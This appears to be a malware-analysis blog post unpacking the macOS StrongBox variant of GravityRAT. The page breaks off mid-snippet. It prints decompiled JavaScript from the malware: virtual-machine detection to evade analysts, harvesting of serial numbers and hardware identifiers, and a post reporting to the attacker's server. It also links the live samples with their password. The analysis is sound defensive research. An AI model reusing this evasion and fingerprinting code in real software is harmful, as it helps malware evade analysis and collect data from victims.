<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  <head>
    <meta charset="UTF-8">
    
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    <link href="../css/style.css" rel="stylesheet" />
    <script src="../js/analytics.js"></script>
    <script src="../js/sweetalert.min.js"></script>
    <script src="../js/donationPopup.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
    
    
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x5C/blockblock.png />
<meta name="twitter:title" content=Adventures&#32;in&#32;Anti-Gravity&#32;(Part&#32;II) />
<meta name="twitter:description" content=Deconstructing&#32;the&#32;Mac&#32;Variant&#32;of&#32;GravityRAT />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=Adventures&#32;in&#32;Anti-Gravity&#32;(Part&#32;II) />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x5C/blockblock.png />

    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/products.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    <div class="pageContent">
      <br>
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">Adventures in Anti-Gravity (Part II)</div>
  <div class="blogSubTitle">Deconstructing the Mac Variant of GravityRAT</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / November 27, 2020</div>
  <div style="border: 1px solid #DCDCDC; border-radius:7px; padding: 10px; margin-top:15px; margin-bottom: 15px">
    <center>Love these blog posts and/or want to support my research and tools? You can support them via my <a href="https://www.patreon.com/bePatron?c=701171" class="inlineLink">Patreon</a> page!
    <br><br>
    <a href="https://www.patreon.com/bePatron?c=701171" style="text-decoration: none;">
      <img src="../images/patreon.png" style="display:block;margin:auto; padding-top:0px; width:100%"/>
    </a>
    </center>
</div>
<br>
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>I&rsquo;ve added the <a href="https://objective-see.com/downloads/malware/GravityRAT.zip">samples</a> (GravityRat) to our malware collection (password: infect3d)</p>
<p>&hellip;please donâ€™t infect yourself!</p>
</div>
<h3 id="background">Background</h3>
<p>In <a href="blog_0x5B.html">part one</a>, we detailed the (new) macOS variant of GravityRat. Of the various (macOS) samples, we focused first on a binary named <code>Enigma</code>:</p>
<blockquote>
  "<i>A brief triage revealed that while the <code>Enigma</code> file appeared unique, the other three (<code>OrangeVault</code>, <code>StrongBox</code>, and <code>TeraSpace</code>) appeared quite similar. As such, we'll first dive into the <code>Enigma</code> binary.</i>"
</blockquote>
<p>In this post, we continue our analysis, but now focus on the <code>StrongBox</code> binary, from the other group of files.</p>
<h3 id="strongbox">StrongBox</h3>
<p>The <code>StrongBox</code> file (<code>SHA1: e33894042f3798516967471d0ce1e92d10dec756</code>) is an unsigned Mach-O binary:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ file GravityRAT/StrongBox 
GravityRAT/StrongBox: Mach-O 64-bit executable x86_64

$ codesign -dvvv GravityRAT/StrongBox 
GravityRAT/StrongBox: code object is not signed at all
</pre>
</div>
<p>By extracting embedded strings, we can see the <code>StrongBox</code> was packaged up with <code>PyInstaller</code> (as was the <code>Enigma</code> binary):</p>
<p><div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ strings - GravityRAT/StrongBox | grep Python
Py_SetPythonHome
Error loading Python lib '%s': dlopen: %s
Error detected starting Python VM.
Python
</pre>
</div>
<br></p>
<div class="note">
<p>Leveraging a tool such as <code>PyInstaller</code> allows developers (or malware authors) to write cross-platform python code, then generate native, platform-specific binaries:</p>
<p>&ldquo;<i>PyInstaller freezes (packages) Python applications into stand-alone executables, under Windows, GNU/Linux, Mac OS X, FreeBSD, Solaris and AIX.</i>&rdquo;</p>
<p>To learn more about PyInstaller, head over to:</p>
<center>
  <a href="https://www.pyinstaller.org/" class="inlineLink">PyInstaller.org</a>.
</center>
</div>
<p>As <code>StrongBox</code> was packaged up with <code>PyInstaller</code> we can use the <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a> utility to extact (unpackage) it&rsquo;s contents:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ python pyinstxtractor.py StrongBox 
[+] Processing GravityRAT/StrongBox
[+] Pyinstaller version: 2.1+
[+] Python version: 37
[+] Length of package: 68331218 bytes
[+] Found 50 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: strong.pyc
...
[+] Successfully extracted pyinstaller archive: StrongBox

You can now use a python decompiler on the pyc files within the extracted directory
</pre>
</div>
<p>Poking around in the extracted files, reveals a compressed file, named <code>app</code> in the <code>Extras</code> directory:</p>
<img src="../images/blog/blog_0x5C/extra.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Extras/app</center>

<p>Decompressing (unzipping) the <code>app</code> file, reveals an application named <code>StrongBox.app</code> &hellip;which (unsurprisingly) is also unsigned:</p>
<img src="../images/blog/blog_0x5C/unsigned.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">StrongBox.app, unsigned</center>

<p>Usually when triaging an application, I manually poke around via the terminal. However, a new (free!) app named <a href="https://www.mothersruin.com/software/Apparency/use.html">Apparency</a> (from the developers of <a href="https://www.mothersruin.com/software/SuspiciousPackage/">Suspicious Package</a>), offers a way to statically explore applications via the UI:</p>
<img src="../images/blog/blog_0x5C/apparency.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">StrongBox.app, in Apparency</center>

<p>&hellip;including information about the application&rsquo;s main executable, <code>StrongBox.app/Contents/MacOS/StrongBox</code>:</p>
<img src="../images/blog/blog_0x5C/executable.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">StrongBox.app/Contents/MacOS/StrongBox</center>

<p>Of note in the <a href="https://www.mothersruin.com/software/Apparency/use.html">Apparency</a> output are <code>StrongBox.app's</code> &ldquo;Dynamically Linked Libraries&rdquo; &hellip;most notably the <code>Electron Framework</code>.</p>
<div class="note">
<p>Electon is, &ldquo;<i>a framework for creating native applications with web technologies like JavaScript, HTML, and CSS</i>.&rdquo;</p>
<p>To learn more about Electon, head over to:</p>
<center>
  <a href="https://www.electronjs.org/" class="inlineLink">ElectronJS.org</a>.
</center>
</div>
<p>This presence of the Electron framework is unsurprising, as (recall) Kaspersky&rsquo;s <a href="https://securelist.com/gravityrat-the-spy-returns/99097/">report</a> noted:</p>
<blockquote>
  "<i>The ...versions are multiplatform for Windows and Mac based on the Electron framework.</i>"
</blockquote>
<p>From a reversing point of view, this is good news. Why? Electron applications are rather trivial to analyze, as they (always?) ship with their original (JavaScript) source code. However this code may be archived and thus, must first be unpacked.</p>
<p>If an Electron application is packed, the archive format is <code>asar</code>. From the <code>asar</code> <a href="https://github.com/electron/asar">github repo</a>:</p>
<blockquote>
  "<i>Asar is a simple extensive archive format, it works like tar that concatenates all files together without compression, while having random access support.</i>"
</blockquote>
<p>As noted in a StackOver post titled, &ldquo;<a href="https://stackoverflow.com/questions/38523617/how-to-unpack-an-asar-file">How to unpack an .asar file?</a>&rdquo; one can unpack an <code>asar</code> archive via the following: <code>npx asar extract app.asar destfolder</code>.</p>
<p>In the <code>StrongBox.app</code> we find an <code>asar</code> archive (<code>app.asar</code>) in <code>Contents/Resources/</code> and extract it in the following manner:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ npx asar extract StrongBox.app/Contents/Resources/app.asar APP_ASAR
</pre>
</div>
<p>The extracted archive contains various files, most notably several JavaScript files:</p>
<img src="../images/blog/blog_0x5C/asar.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">Un-asar&#39;d files</center>

<p>And what do these file do? Welk, in Kaspersky&rsquo;s <a href="https://securelist.com/gravityrat-the-spy-returns/99097/">report</a> they noted that each of the Electron versions of the malware:</p>
<blockquote>
  "<i>checks if it is running on a virtual machine, collects information about the computer, downloads the payload from the server, and adds a scheduled task.</i>"
</blockquote>
<p>Let&rsquo;s analyze the unarchived JavaScript files <code>main.js</code> and <code>signature.js</code>, highlighting the code responsible for these actions.</p>
<div class="note">
<p>Both JavaScript files are cross-platform (designed to run on both Windows and macOS).
Logic specific to macOS is executed within &ldquo;is darwin&rdquo; code blocks:</p>
<p>var osvar = process.platform;
<br>
if( osvar.trim()== &ldquo;darwin&rdquo; ) {</p>
<p>Â //macOS specific logic</p>
<p>}</p>
</div>
<p>The <code>main.js</code> contains logic, mostly related to various checks including:</p>
<ul>
<li>check if running in a VM</li>
<li>check if not connected to the Internet</li>
<li>check if not running with Full Disk Access (FDA)</li>
</ul>
<p>Let&rsquo;s take a closer look at each of these.</p>
<p>The aptly named function, <code>VMCheck</code>, checks if the application is running within a Virtual Machine. Virtual machine checks are commonly found in malware, in an attempt to ascertain if a malware analyst is (likely) examining the code (in a virtual machine).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">VMCheck</span>(<span style="color:#a6e22e">stdout</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;innotek GmbH&#34;</span>) <span style="color:#f92672">||</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>      <span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;VirtualBox&#34;</span>) <span style="color:#f92672">||</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>      <span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;VMware&#34;</span>) <span style="color:#f92672">||</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>      <span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;Microsoft Corporation&#34;</span> <span style="color:#f92672">||</span> 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>      <span style="color:#a6e22e">stdout</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#34;HITACHI&#34;</span>))) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>      <span style="color:#a6e22e">axios</span>.<span style="color:#a6e22e">post</span>(<span style="color:#a6e22e">srdr</span>, {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>        <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;vm&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>        <span style="color:#a6e22e">status</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>  })
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>    <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;question&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>    <span style="color:#a6e22e">buttons</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#39;Ok&#39;</span>],
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    <span style="color:#a6e22e">defaultId</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>    <span style="color:#a6e22e">title</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;StrongBOX - Operation Not Permitted in VirtualBOX&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>    <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Action Required&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>    <span style="color:#a6e22e">detail</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;StrongBOX - Unable to load components\n
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span><span style="color:#e6db74">             Please exit virtual mode to launch the application.&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>  };
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>  <span style="color:#a6e22e">dialog</span>.<span style="color:#a6e22e">showMessageBox</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">options</span>, (<span style="color:#a6e22e">response</span>, <span style="color:#a6e22e">checkboxChecked</span>) =&gt; {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>    <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">quit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>    <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">exit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>  });</span></span></code></pre></div>
<p>&hellip;pretty easy to see its checking if the passed in parameter (<code>stdout</code>) contains strings related to popular virtual machine products (e.g. <code>VMware</code>). So what&rsquo;s in the <code>stdout</code> parameter? Well, if the malware is running on a macOS system, the <code>VMCheck</code> function will be invoked from within a function named <code>Vmm</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Vmm</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">modname</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;system_profiler SPHardwareDataType | grep &#39;Model Name&#39;&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">smc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;system_profiler SPHardwareDataType | grep &#39;SMC&#39;&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">modid</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;system_profiler SPHardwareDataType | grep &#39;Model Identifier&#39;&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">rom</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;system_profiler SPHardwareDataType | grep &#39;ROM&#39;&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">snum</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;system_profiler SPHardwareDataType | grep &#39;Serial Number&#39;&#34;</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>    <span style="color:#a6e22e">VMCheck</span>(<span style="color:#a6e22e">modname</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">smc</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">modid</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">rom</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">snum</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>}</span></span></code></pre></div>
<p>The <code>Vmm</code> function gets the system identifying information such as the model name, model identifier, serial number and more. If executed within a virtual machine, this information will contain VM-related strings:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">

$ system_profiler SPHardwareDataType | grep 'Model Identifier'
  Model Identifier: VMware7,1


$ system_profiler SPHardwareDataType | grep 'ROM'
      Boot ROM Version: VMW71.00V.16221537.B64.2005150253
      Apple ROM Info: [MS_VM_CERT/SHA1/27d66596a61c48dd3dc7216fd715126e33f59ae7]
      Welcome to the Virtual Machine

</pre>
</div>
<p>&hellip;thus the malware will be able to detect it&rsquo;s running within a virtual machine &hellip;and display an error message</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">VMCheck</span>(<span style="color:#a6e22e">stdout</span>) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>  ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">options</span> <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>      <span style="color:#a6e22e">type</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;question&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>      <span style="color:#a6e22e">buttons</span><span style="color:#f92672">:</span> [<span style="color:#e6db74">&#39;Ok&#39;</span>],
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>      <span style="color:#a6e22e">defaultId</span><span style="color:#f92672">:</span> <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>      <span style="color:#a6e22e">title</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;StrongBOX - Operation Not Permitted&#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>      <span style="color:#a6e22e">message</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Oops!! Something went wrong. &#39;</span>,
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>      <span style="color:#a6e22e">detail</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Please check your internet connection and try again.&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    };
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    <span style="color:#a6e22e">dialog</span>.<span style="color:#a6e22e">showMessageBox</span>(<span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">options</span>, (<span style="color:#a6e22e">response</span>, <span style="color:#a6e22e">checkboxChecked</span>) =&gt; {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>      <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">quit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>      <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">exit</span>();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>    });
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>  });</span></span></code></pre></div>
<p>However, it appears that perhaps there is bug in the malware&rsquo;s code, and an incorrect error message will be displayed &hellip; &ldquo;<em>Please check your internet connection and try again.</em>&rdquo;:</p>
<img src="../images/blog/blog_0x5C/alert.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">(incorrect) Error Message</center>

<p>The <code>main.js</code> file also contains logic for a simple &ldquo;is connected&rdquo; check. Often malware performs such checks to ensure it can communicate with a remote command and control server, and/or to detect if it is perhaps executing on an offline analysis system.</p>
<p>To ascertain if it&rsquo;s running on an Internet connection system, the malware invokes a function named <code>connection</code> which simply attempts to ping <code>www.google.com</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">connection</span>(){ 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    <span style="color:#a6e22e">execRoot</span>(<span style="color:#e6db74">&#39;ping -t 4 www.google.com&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">error</span>, <span style="color:#a6e22e">stdout</span>, <span style="color:#a6e22e">stderr</span>){
